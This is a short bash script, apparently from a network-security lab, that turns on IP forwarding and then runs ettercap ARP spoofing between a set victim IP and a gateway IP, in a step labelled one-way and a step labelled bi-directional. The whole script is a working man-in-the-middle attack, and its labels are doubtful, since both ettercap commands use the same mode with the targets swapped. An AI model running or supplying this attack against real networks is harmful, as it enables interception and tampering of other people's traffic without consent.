#!/bin/bash

# -----------------------------
# VARIABLES (Set accordingly)
# -----------------------------
GATEWAY_IP="192.168.1.1"
VICTIM_IP="192.168.1.10"
INTERFACE="enp0s3"

# -----------------------------
# 1. Enable IP Forwarding
# -----------------------------
echo "[*] Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# -----------------------------
# 2. One-Way ARP Spoofing (Victim → Gateway)
# -----------------------------
echo "[*] Launching One-Way ARP Spoofing: Spoofing victim to gateway..."
sudo ettercap -T -M arp:remote /"$VICTIM_IP"/ /"$GATEWAY_IP"/ -i "$INTERFACE"

# -----------------------------
# 3. Bi-Directional ARP Spoofing (Victim ↔ Gateway)
# -----------------------------
echo "[*] Launching Bi-Directional ARP Spoofing: Spoofing both victim and gateway..."
sudo ettercap -T -M arp:remote /"$GATEWAY_IP"/ /"$VICTIM_IP"/ -i "$INTERFACE"

